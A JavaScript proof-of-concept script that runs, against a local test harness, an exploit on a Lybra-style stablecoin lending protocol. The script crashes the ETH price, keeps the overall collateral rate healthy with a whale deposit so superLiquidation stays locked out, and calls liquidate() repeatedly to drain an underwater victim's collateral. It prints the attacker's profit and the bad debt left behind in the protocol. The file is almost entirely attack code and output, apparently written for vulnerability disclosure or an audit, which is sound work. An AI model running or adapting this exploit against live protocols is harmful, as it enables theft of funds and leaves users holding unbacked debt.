const { setup, E, addr } = require('./harness');
const V = addr(0x11), P = addr(0x22), K = addr(0x33), W = addr(0x44);
const n = (x, d = 3) => (Number(x * 1000n / E) / 1000).toFixed(d);

(async () => {
  const t = await setup({ price: 2000n * E });
  for (const a of [V, P, K, W]) { await t.fund(a, 10n ** 25n); await t.stMint(a, 500000n * E); await t.stApprove(a, t.lybra, 1n << 255n); }

  // whale keeps the OVERALL rate healthy so superLiquidation stays locked out
  await t.depositEther(W, W, 1000000n * E, 5000n * E);
  // victim at 160%
  await t.depositEther(V, V, 125000n * E, 100n * E);
  // provider with eUSD + allowance
  await t.depositEther(P, P, 1000000n * E, 5000n * E);
  await t.approveEUSD(P, t.lybra, 1n << 200n);

  const rate = async a => (await t.deposited(a)) * (await t.price()) * 100n / (await t.borrowed(a));
  const pct = r => (Number(r / 10n ** 16n) / 100).toFixed(2) + '%';
  const overall = async () => (await t.totalDeposited()) * (await t.price()) * 100n / (await t.totalSupply());

  console.log('victim rate @$2000:', pct(await rate(V)), ' overall:', pct(await overall()));
  console.log('\n--- crash ETH to $900 (victim deeply underwater, below 110%) ---');
  await t.setPrice(900n * E);
  console.log('victim rate:', pct(await rate(V)), ' overall:', pct(await overall()));
  console.log('victim collateral value $', n((await t.deposited(V)) * 900n), ' debt $', n(await t.borrowed(V)));
  console.log('=> victim has NEGATIVE equity: the 10% bonus can no longer come out of their own equity.');
  try { await t.superLiquidate(K, P, V, 1n * E); } catch (e) { console.log('superLiquidation gate:', e.message); }

  const sys = async () => {
    const td = await t.totalDeposited(), ts = await t.totalSupply();
    return { backing: td * (await t.price()) - ts, td, ts };
  };
  let s0 = await sys();
  const pSt0 = await t.stBal(P), pEu0 = await t.eusdBal(P), kSt0 = await t.stBal(K);
  console.log('\nsystem backing surplus before: $', n(s0.backing));

  console.log('\n--- iterate liquidation(): each call seizes 55% of what remains ---');
  for (let i = 0; i < 25; i++) {
    const d = await t.deposited(V);
    if (d < 10n ** 12n) break;
    try { await t.liquidate(K, P, V, d / 2n); } catch (e) { console.log('  stop at round', i, ':', e.message); break; }
    if (i < 3 || i % 8 === 0) console.log(`  round ${i}: victim collateral ${n(await t.deposited(V))} ETH, debt $${n(await t.borrowed(V))}, rate ${(await t.borrowed(V)) > 0n ? pct(await rate(V)) : '-'}`);
  }
  const s1 = await sys();
  console.log('\nvictim collateral left:', n(await t.deposited(V)), 'ETH   debt left: $', n(await t.borrowed(V)));
  console.log('  ^ that leftover debt is eUSD with ZERO collateral behind it (bad debt)');
  console.log('\nattacker-side P&L (provider+keeper controlled by one actor):');
  console.log('  provider stETH gained :', n((await t.stBal(P)) - pSt0), 'stETH  = $', n(((await t.stBal(P)) - pSt0) * 900n));
  console.log('  provider eUSD spent   : $', n(pEu0 - (await t.eusdBal(P))));
  console.log('  keeper   stETH gained :', n((await t.stBal(K)) - kSt0), 'stETH  = $', n(((await t.stBal(K)) - kSt0) * 900n));
  const gain = ((await t.stBal(P)) - pSt0 + (await t.stBal(K)) - kSt0) * 900n - (pEu0 - (await t.eusdBal(P)));
  console.log('  NET to attacker       : $', n(gain));
  console.log('\nsystem backing surplus after : $', n(s1.backing), '  (delta $', n(s1.backing - s0.backing), ')');
})().catch(e => { console.error('ERR', e.message); process.exit(1); });
